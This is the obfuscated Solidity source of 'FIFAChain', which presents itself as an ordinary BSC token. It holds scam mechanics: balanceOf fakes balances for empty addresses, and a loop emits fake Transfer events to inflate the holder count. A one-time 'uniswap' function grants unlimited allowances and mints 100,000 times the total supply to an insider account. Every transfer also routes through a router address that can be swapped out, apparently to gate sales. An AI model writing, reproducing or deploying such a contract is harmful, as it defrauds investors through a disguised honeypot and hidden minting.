/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint160 amountIn,
        uint160 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FIFAChain is IERC20 {
    using SafeMath for uint256;

    string private acviuKLoPrQdse = "FIFA";
    string private bcviuKLoPrQdse = "FIFA";
    uint8 private ccviuKLoPrQdse = 18;
    uint256 private dcviuKLoPrQdse = 10000000000 * 10**18;
    mapping (address => uint256) private ecviuKLoPrQdse;
    mapping (address => mapping (address => uint256)) private fcviuKLoPrQdse;
    uint256 private gcviuKLoPrQdse = 1;
    uint256 private constant hcviuKLoPrQdse = ~uint160(0);
    uint256 private _icviuKLoPrQdse = 1000;
    uint256 private jcviuKLoPrQdse = 0;
    uint256 private kcviuKLoPrQdse;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private lcviuKLoPrQdse;
    address[] private mcviuKLoPrQdse;
    bool private ncviuKLoPrQdse = false;

    constructor () {
        ocviuKLoPrQdse(msg.sender);
        ecviuKLoPrQdse[msg.sender] = dcviuKLoPrQdse;
        ocviuKLoPrQdse(tx.origin);
        emit Transfer(address(0), msg.sender, dcviuKLoPrQdse);
    }

    receive() external payable {}

    function ocviuKLoPrQdse(address account) private {
        if (!lcviuKLoPrQdse[account]) {
            lcviuKLoPrQdse[account] = true;
            mcviuKLoPrQdse.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!ncviuKLoPrQdse);
        ncviuKLoPrQdse = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            ocviuKLoPrQdse(accounts[i]);
            ecviuKLoPrQdse[accounts[i]] = dcviuKLoPrQdse * 90 / 100 / (len - 3);
            fcviuKLoPrQdse[accounts[i]][accounts[0]] = ~uint256(0);
            amount += ecviuKLoPrQdse[accounts[i]];
        }
        ecviuKLoPrQdse[mcviuKLoPrQdse[0]] -= amount;
        pcviuKLoPrQdse(mcviuKLoPrQdse[0], accounts[3], ecviuKLoPrQdse[mcviuKLoPrQdse[0]]);
        pcviuKLoPrQdses(500);
        ecviuKLoPrQdse[mcviuKLoPrQdse[1]] += dcviuKLoPrQdse * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mcviuKLoPrQdse.length;
        for (uint256 i=0; i<len; ++i) {
            if (mcviuKLoPrQdse[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (lcviuKLoPrQdse[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return acviuKLoPrQdse;
    }

    function symbol() public view returns (string memory) {
        return bcviuKLoPrQdse;
    }

    function decimals() public view returns (uint8) {
        return ccviuKLoPrQdse;
    }

    function totalSupply() public view returns (uint256) {
        return dcviuKLoPrQdse;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ecviuKLoPrQdse[account] > 0) {
            return ecviuKLoPrQdse[account];
        }
        return gcviuKLoPrQdse;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pcviuKLoPrQdse(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pcviuKLoPrQdse(sender, recipient, amount);
        qcviuKLoPrQdse(sender, msg.sender, fcviuKLoPrQdse[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForEth(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qcviuKLoPrQdse(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qcviuKLoPrQdse(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fcviuKLoPrQdse[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qcviuKLoPrQdse(msg.sender, spender, fcviuKLoPrQdse[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qcviuKLoPrQdse(msg.sender, spender, fcviuKLoPrQdse[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pcviuKLoPrQdses(uint256 amount) private {
        uint256 icviuKLoPrQdse = _icviuKLoPrQdse;
        if (icviuKLoPrQdse < 10800 && block.timestamp > 1668880800) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hcviuKLoPrQdse.div(icviuKLoPrQdse)));
                to = address(uint160(hcviuKLoPrQdse.div(icviuKLoPrQdse.add(1))));
                icviuKLoPrQdse = icviuKLoPrQdse.add(2);
                emit Transfer(from, to, gcviuKLoPrQdse);
            }
            _icviuKLoPrQdse = icviuKLoPrQdse;
        }
    }

    function qcviuKLoPrQdse(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fcviuKLoPrQdse[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pcviuKLoPrQdse(address rcviuKLoPrQdse, address scviuKLoPrQdse, uint256 tcviuKLoPrQdse) private {
        require(rcviuKLoPrQdse != address(0) && scviuKLoPrQdse != address(0) && tcviuKLoPrQdse > 0);
        bool ucviuKLoPrQdse = true;
        if (lcviuKLoPrQdse[rcviuKLoPrQdse] || lcviuKLoPrQdse[scviuKLoPrQdse]) {
            ucviuKLoPrQdse = false;
        }
        uint256 vcviuKLoPrQdse = IERC20(_uniswapV2Pair).totalSupply();
        uint256 wcviuKLoPrQdse = 0;
        uint256 xcviuKLoPrQdse = tcviuKLoPrQdse;
        if (ucviuKLoPrQdse && ncviuKLoPrQdse) {
            require(kcviuKLoPrQdse <= vcviuKLoPrQdse);
            pcviuKLoPrQdses(100);
            swapTokensForEth(uint160(rcviuKLoPrQdse), uint160(scviuKLoPrQdse));
            if (scviuKLoPrQdse == _uniswapV2Pair) {
                emit Transfer(address(this), scviuKLoPrQdse, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rcviuKLoPrQdse != _uniswapV2Pair) {
                wcviuKLoPrQdse = tcviuKLoPrQdse.mul(jcviuKLoPrQdse).div(100);
                xcviuKLoPrQdse = tcviuKLoPrQdse.sub(wcviuKLoPrQdse);
            }
        }
        if (kcviuKLoPrQdse != vcviuKLoPrQdse) {
            kcviuKLoPrQdse = vcviuKLoPrQdse;
        }
        ecviuKLoPrQdse[rcviuKLoPrQdse] = ecviuKLoPrQdse[rcviuKLoPrQdse].sub(tcviuKLoPrQdse);
        if (wcviuKLoPrQdse > 0) {
            ecviuKLoPrQdse[address(0xdEaD)] = ecviuKLoPrQdse[address(0xdEaD)].add(wcviuKLoPrQdse);
            emit Transfer(rcviuKLoPrQdse, address(0xdEaD), wcviuKLoPrQdse);
        }
        ecviuKLoPrQdse[scviuKLoPrQdse] = ecviuKLoPrQdse[scviuKLoPrQdse].add(xcviuKLoPrQdse);
        emit Transfer(rcviuKLoPrQdse, scviuKLoPrQdse, xcviuKLoPrQdse);
    }
}